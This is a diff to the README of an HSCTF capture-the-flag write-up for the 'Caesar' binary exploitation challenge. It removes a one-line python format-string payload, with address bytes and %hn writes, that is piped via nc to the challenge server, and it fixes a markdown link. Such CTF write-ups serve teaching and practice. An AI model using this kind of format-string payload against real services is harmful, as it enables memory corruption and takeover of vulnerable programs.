@@ -1,8 +1,6 @@
 # Caesar (Binary Exploitation, 300 points)
 
-python -c "print '\x22\xa0\x04\x08\x20\xa0\x04\x08%2044x%31\$hn%32870x%32\$hn\n' + '0\n'" | nc shell.hsctf.com 10003
-
-This writeup requires some background explanation. [Click here to skip that and get straight to the writeup!])(./README.md#writeup)
+This writeup requires some background explanation. [Click here to skip that and get straight to the writeup!](./README.md#writeup)
 
 ## What are we trying to do? How does this exploit work?
 
